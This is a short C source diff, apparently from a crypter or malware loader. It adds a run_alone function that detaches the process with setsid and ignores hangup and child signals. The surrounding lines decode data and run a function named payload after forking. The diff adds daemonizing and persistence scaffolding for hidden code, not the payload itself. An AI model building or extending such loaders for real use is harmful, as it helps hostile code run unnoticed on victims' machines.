@@ -147,6 +147,16 @@ void remove_first_time(crypter_t *crypter)
         key[i] = 1;
 }
 
+int run_alone(void)
+{
+    pid_t sid = setsid();
+
+    if (sid < 0) exit(84);
+
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+}
+
 /* main */
 int main(int ac, char const * const *av)
 {
@@ -158,7 +168,7 @@ int main(int ac, char const * const *av)
     decode_and_crypt(crypter); /* Decode 😇 */
     if(fork())
         exit(0);
-    signal(SIGCHLD, SIG_IGN);
     payload(); /* 😈 */
+    run_alone();
     return (0);
 }
